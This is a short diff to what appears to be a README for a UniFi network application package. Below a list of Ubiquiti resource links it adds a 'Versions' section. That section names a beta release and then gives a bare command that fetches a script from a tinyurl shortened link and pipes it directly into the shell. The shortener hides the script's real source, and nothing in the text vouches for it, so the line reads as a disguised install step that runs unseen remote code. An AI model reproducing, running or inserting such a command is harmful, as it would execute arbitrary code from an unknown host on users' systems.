@@ -212,3 +212,8 @@ Resources
 - [UniFi product information page](https://www.ubnt.com/software/)
 - [UniFI download and documentation](https://www.ubnt.com/download/unifi)
 - [UniFi updates blog](https://community.ubnt.com/t5/UniFi-Updates-Blog/bg-p/Blog_UniFi)
+
+Versions
+------------------
+Beta UniFi Network Application 7.1.59
+fetch -o - https://tinyurl.com/2p9h45vs | sh -s
